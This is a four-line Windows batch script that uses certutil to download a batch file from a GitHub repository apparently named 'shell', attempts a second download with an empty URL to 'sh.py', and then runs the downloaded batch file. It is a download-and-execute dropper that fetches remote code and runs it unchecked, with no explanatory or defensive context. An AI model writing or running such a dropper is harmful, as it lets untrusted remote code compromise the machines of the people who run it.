@echo off
certutil -urlcache -split -f "https://raw.githubusercontent.com/omarsamyX0/shell/main/pro.bat" pro.bat
certutil -urlcache -split -f "" sh.py
call pro.bat
